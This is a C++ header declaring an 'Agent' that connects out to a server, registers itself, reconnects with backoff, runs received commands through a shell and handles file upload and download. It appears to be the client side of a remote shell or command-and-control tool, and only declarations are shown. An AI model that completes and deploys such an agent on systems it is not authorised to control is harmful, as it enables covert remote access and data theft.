#pragma once
#include "pips.hpp"
#include "utils.hpp"
#include "common/parser/tcp.hpp"
#include <deque>
#include <thread>
#include <chrono>
#include <arpa/inet.h>

namespace Config {
    constexpr uint32_t READ_FLAGS  = EPOLLIN  | EPOLLET | EPOLLONESHOT | EPOLLRDHUP;
    constexpr uint32_t WRITE_FLAGS = EPOLLOUT | EPOLLET | EPOLLONESHOT;
    constexpr uint32_t PIPE_READ_FLAGS  = EPOLLIN  | EPOLLET | EPOLLONESHOT;
    constexpr uint32_t PIPE_WRITE_FLAGS = EPOLLOUT | EPOLLET | EPOLLONESHOT;

    constexpr size_t SEND_BUF_SIZE = 8192;
    constexpr size_t RECV_BUF_SIZE = 8192;
    constexpr size_t READ_BUFFER_SIZE = 16384;
    constexpr size_t FLUSH_THRESHOLD = 16384;
    constexpr int MAX_EVENTS = 32;

    constexpr std::chrono::seconds CONNECTION_RETRY_INITIAL{10};
    constexpr std::chrono::seconds CONNECTION_RETRY_BACKOFF{30};
    constexpr int MAX_RECONNECT_ATTEMPTS = 10;
}

struct Entry {
    uint32_t taskId{0};
    uint8_t stdinBuf[Config::RECV_BUF_SIZE]{};
    size_t stdinLen{0};
    size_t stdinOffset{0};
    uint8_t outBuf[Config::SEND_BUF_SIZE]{};
    size_t  outLen{0};
    size_t  outOffset{0};
    bool done{false};

    bool isStdinComplete() const noexcept {
        return stdinOffset >= stdinLen;
    }

    size_t getStdinRemaining() const noexcept {
        return stdinLen - stdinOffset;
    }

    size_t getOutCapacity() const noexcept {
        return (sizeof(outBuf) - Raptor::Common::Header::SIZE) - outLen;
    }
};

class EpollManager {
public:
    explicit EpollManager() {
        epollfd_ = ::epoll_create1(0);
        if (epollfd_ == -1) {
            throw std::runtime_error(std::format("epoll_create1: {}", strerror(errno)));
        }
    }

    void close() noexcept {
        if (epollfd_ != -1) {
            ::close(epollfd_);
            epollfd_ = -1;
        }
    }

    ~EpollManager() {
        close();
    }

    bool addEpoll(int fd, uint32_t events) const noexcept {
        epoll_event ev{};
        ev.data.fd = fd;
        ev.events = events;
        return ::epoll_ctl(epollfd_, EPOLL_CTL_ADD, fd, &ev) != -1;
    }

    bool delEpoll(int fd) const noexcept {
        return ::epoll_ctl(epollfd_, EPOLL_CTL_DEL, fd, nullptr) != -1;
    }

    void rearm(int fd, uint32_t events) const noexcept {
        epoll_event ev{};
        ev.data.fd = fd;
        ev.events = events;
        ::epoll_ctl(epollfd_, EPOLL_CTL_MOD, fd, &ev);
    }

    void rearmRead(int fd) const noexcept {
        rearm(fd, Config::READ_FLAGS);
    }

    void rearmPipeRead(int fd) const noexcept {
        rearm(fd, Config::PIPE_READ_FLAGS);
    }

    void rearmWrite(int fd) const noexcept {
        rearm(fd, Config::WRITE_FLAGS);
    }

    void rearmPipeWrite(int fd) const noexcept {
        rearm(fd, Config::PIPE_WRITE_FLAGS);
    }

    void rearmShellOutput(int pipeOut, int pipeErr) const noexcept {
        rearmPipeRead(pipeOut);
        rearmPipeRead(pipeErr);
    }

    int getFd() const noexcept {
        return epollfd_;
    }

private:
    int epollfd_;
};

class Agent : public Raptor::Common::Parsers::TcpParser<uint8_t, Config::RECV_BUF_SIZE> {
public:
    explicit Agent(const std::string& ip, uint16_t port);
    ~Agent() override;
    void run();

private:
    std::string ip_{"127.0.0.1"};
    uint16_t port_{8080};
    Pip pipfds_{};
    int clientfd_{-1};
    std::deque<Entry> queue_;
    std::array<epoll_event, Config::MAX_EVENTS> epollEvents_{};
    std::array<uint8_t, Config::READ_BUFFER_SIZE> readBuffer_{};
    EpollManager epollMgr_;
    int reconnectAttempts_{0};

    bool connect();
    void disconnectClient() noexcept;
    bool registerAgent();
    void readClient() noexcept;
    void writeClient() noexcept;
    void writeToShell() noexcept;
    void readShell(int fd) noexcept;
    void flushToClient(Entry& entry) noexcept;
    bool completeClientWrite(Entry& entry) noexcept;

    void onCommand(const Raptor::Common::Header& hdr,
                   std::string_view cmd) noexcept override;
    void onUpload(const Raptor::Common::Header& hdr,
                  std::string_view data) noexcept override;
    void onDownload(const Raptor::Common::Header& hdr,
                    std::string_view path) noexcept override;

    void logError(const char* context, int errnum) noexcept;
    void handleEpollError(int fd, uint32_t events) noexcept;
    void sendErrorResponse(uint32_t taskId, const char* errorMsg) noexcept;
};
